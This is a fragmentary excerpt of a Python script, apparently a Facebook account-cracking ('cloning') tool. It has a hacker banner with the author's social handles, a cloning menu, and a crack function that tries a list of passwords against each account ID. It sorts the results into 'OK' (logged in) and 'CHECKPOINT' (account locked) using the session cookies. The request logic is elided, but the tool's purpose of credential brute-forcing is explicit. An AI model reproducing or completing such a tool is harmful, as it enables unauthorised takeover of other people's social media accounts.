...
def banner():
	clear()
	sol()
	ban=''' © MASTER MADA HACKER😈😈
______ __   __ _   _   
| ___ \\ \ / /| \ | | / _ \ 
| |_/ / \ V / |  \| |/ /_\ \            [🇲🇬]  Github: Rynathid
|    /   \ /  | . ` ||  _  |        [🇲🇬]  FACEBOOK JUDICAELRYNATHID
| |\ \   | |  | |\  || | | |              
\_| \_|  \_/  \_| \_/\_| |_/         [🇲🇬]    YOUTUBE : Rynathide                            '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             TONGASOA : [yellow]ENJOY PUBLIC TOOL[purple] '))
...
#-------------[ Id -Crackiing]---------------#
def setting():
	cetak(nel('\t[gtreen]         CLONING MENU • [/bold cyan]'))
	print('') 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RINA-ROCKI-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ RINA-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ RINA-OK ❤️✨[green]')) 
